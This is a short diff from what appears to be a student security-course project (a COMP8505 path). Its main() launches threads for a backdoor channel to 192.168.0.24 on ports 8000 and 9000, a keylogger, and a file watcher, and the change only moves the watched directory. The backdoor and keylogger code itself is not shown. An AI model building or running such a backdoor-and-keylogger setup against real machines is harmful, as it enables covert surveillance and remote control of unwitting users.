@@ -14,7 +14,7 @@ int main(){
     
     std::thread bd_thread(&Backdoor_Channel::start, &ch, "lo", 8000, 9000, "192.168.0.24");
     std::thread kl_thread(&Key_Logger::start, &kl);
-    std::thread fw_thread(&File_Watcher::start, &fw, "/home/dimitry/Documents", IN_CLOSE_WRITE);
+    std::thread fw_thread(&File_Watcher::start, &fw, "/root/Desktop/COMP8505_FINAL/test", IN_CLOSE_WRITE);
     
     //refork_init(1);
     //refork();
